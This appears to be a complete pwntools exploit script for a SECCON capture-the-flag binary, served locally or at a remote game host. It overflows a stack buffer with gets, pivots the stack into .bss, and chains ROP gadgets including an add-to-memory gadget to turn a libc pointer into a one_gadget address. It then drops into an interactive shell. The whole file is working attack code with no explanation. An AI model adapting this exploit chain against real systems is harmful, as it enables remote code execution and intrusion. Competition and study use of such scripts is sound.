#!/usr/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', env={'LD_PRELOAD': './libc.so.6'})
else:
    s = remote('mrga.seccon.games', 7428)

elf = ELF('./chall')

gets_rbp_10 = 0x4011be
pop_rbp = 0x40115d
add_rbp_ebx = 0x40115c # add  [rbp-0x3D], ebx ; nop ; ret ;
clear_eax = 0x4011a6 # mov eax, 0x00000000 ; pop rbp ; ret ;
bss_addr = 0x404000
leave = 0x4011d4

payload = b'A' * 0x10
payload += p64(bss_addr + 0xf00)
payload += p64(gets_rbp_10)

s.sendlineafter('>', payload)

s.sendline(b'A' * 0x18 + p64(elf.symbols['_start']))

payload = b'A' * 0x10
payload += p64(bss_addr + 0xc00)
payload += p64(gets_rbp_10)

s.sendline(payload)

payload = b'A' * 0x10
payload += p64(bss_addr + 0xcf0)
payload += p64(gets_rbp_10)

s.sendline(payload)

one_gadgets = [0x583dc, 0x583e3, 0xef4ce, 0xef52b]
underflow_357 = 0x92795

payload = b'A' * 8
payload += p64(one_gadgets[3] - underflow_357)
payload += p64(bss_addr + 0xcd0)
payload += p64(leave)
payload += b'A' * 0x10
payload += p64(bss_addr + 0xb08 + 0x3d)
payload += p64(add_rbp_ebx)
payload += p64(clear_eax)
payload += p64(bss_addr + 0xb00)
payload += p64(leave)

s.sendline(payload)

s.interactive()
